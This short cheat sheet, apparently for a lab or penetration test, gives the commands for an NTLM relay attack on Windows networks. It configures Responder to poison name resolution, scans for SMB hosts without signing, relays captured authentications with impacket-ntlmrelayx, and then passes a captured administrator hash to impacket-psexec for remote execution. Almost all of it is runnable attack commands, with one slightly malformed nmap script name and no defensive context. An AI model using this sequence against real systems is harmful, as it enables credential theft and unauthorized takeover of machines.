# Update Responder configuration
```bash
sudo vim /usr/share/responder/Responder.conf
# SMB = Off and HTTP = Off
```

-----------------------

# Grab list of targets
```bash
sudo nmap --script=smb2=security-mode.nse -p445 10.10.10.0/24 -Pn
```

-----------------------
# Start responder on interface
```bash
sudo responder -I tun0 -dwPv
```

-----------------------
# Relay the requests
```bash
impacket-ntlmrelayx -tf target-list.txt -smb2support
```

-----------------------

# Once we get requests, pass the hash
```bash
impacket-psexec administrator@192.168.196.128 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```
